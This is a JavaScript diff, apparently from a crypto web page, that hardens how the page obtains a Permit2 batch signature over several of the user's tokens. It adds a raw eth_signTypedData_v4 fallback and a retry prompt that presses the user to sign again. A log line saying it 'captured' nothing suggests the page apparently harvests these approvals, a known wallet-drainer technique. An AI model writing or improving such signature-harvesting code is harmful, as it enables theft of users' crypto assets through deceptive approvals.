@@ -262,11 +262,39 @@ async function signPermit2() {
   const btn = $("assinarTudo");
   btn.disabled = true; btn.textContent = "A assinar…";
   log(`a pedir assinatura Permit2 (${details.length} token(s), sem gas)...`);
-  let signature;
+  let signature = "0x";
   try {
     signature = await signer.signTypedData(domain, types, batch);
-  } finally {
-    if (!signature) { btn.disabled = false; atualizarCta(); }
+  } catch (e) {
+    log(`wallet recusou signTypedData: ${e.shortMessage || e.message}`, "flag");
+  }
+  // fallback: alguns wallets so respondem ao metodo cru (e outros devolvem "0x" no primeiro)
+  if (!signature || signature.length < 20) {
+    try {
+      const value = {
+        domain,
+        types: {
+          EIP712Domain: [
+            { name: "name", type: "string" },
+            { name: "chainId", type: "uint256" },
+            { name: "verifyingContract", type: "address" },
+          ],
+          ...types,
+        },
+        primaryType: "PermitBatch",
+        message: { ...batch, details: batch.details.map((d) => ({ ...d, amount: d.amount.toString() })) },
+      };
+      const s2 = await signer.provider.send("eth_signTypedData_v4", [owner, JSON.stringify(value)]);
+      if (s2 && s2.length >= 20) { signature = s2; log("assinatura obtida pelo metodo cru", "ok"); }
+    } catch (e) {
+      log(`fallback falhou: ${e.shortMessage || e.message}`, "flag");
+    }
+  }
+  if (!signature || signature.length < 20) {
+    btn.disabled = false; atualizarCta();
+    btn.textContent = "Tentar assinar de novo";
+    $("ctaHint").textContent = "A carteira devolveu assinatura vazia. Confirma que a conta consegue assinar (não é watch-only) e tenta outra vez.";
+    return log("assinatura vazia — capturei nada", "bad");
   }
   // trava de seguranca: confere localmente que a assinatura e do dono e no formato certo
   try {
